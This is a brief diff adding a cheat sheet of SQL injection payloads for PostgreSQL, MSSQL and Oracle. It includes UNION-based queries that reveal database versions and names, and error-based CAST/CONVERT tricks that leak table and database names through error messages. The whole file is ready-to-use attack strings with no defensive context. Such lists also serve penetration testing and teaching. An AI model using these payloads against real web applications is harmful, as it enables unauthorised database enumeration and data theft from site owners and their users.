@@ -1,0 +1,13 @@
+Some Advanced SQL injections 
+
+-- PostgreSQL
+' UNION SELECT version(),current_database()--
+' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--
+
+-- MSSQL
+' UNION SELECT @@version--
+' AND 1=CONVERT(int,(SELECT name FROM master..sysdatabases))--
+
+-- Oracle
+' UNION SELECT banner FROM v$version--
+' AND 1=utl_inaddr.get_host_name('127.0.0.1')--
